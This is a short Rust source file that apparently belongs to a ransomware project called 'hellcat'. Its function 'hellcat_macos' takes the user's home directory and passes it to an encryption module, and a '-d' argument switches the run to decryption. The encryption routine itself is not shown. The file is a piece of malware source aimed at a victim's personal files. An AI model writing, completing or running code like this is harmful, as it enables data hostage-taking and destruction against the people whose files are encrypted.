use dirs;

// import encyrption module in ./encryption/enc.rs
use crate::encryption::enc::{self};


pub async fn hellcat_macos() {
    // get the home directory
    let home = dirs::home_dir().unwrap();
    let home_str = home.to_str().unwrap();

    println!("Home {}", home_str);

    // get the args
    let mut decrypt:bool = false;

    // check if argument is present
    for argument in std::env::args() {
        if argument == "-d" {
            decrypt = true;
        }
    }

    enc::encryption(home_str, decrypt);
}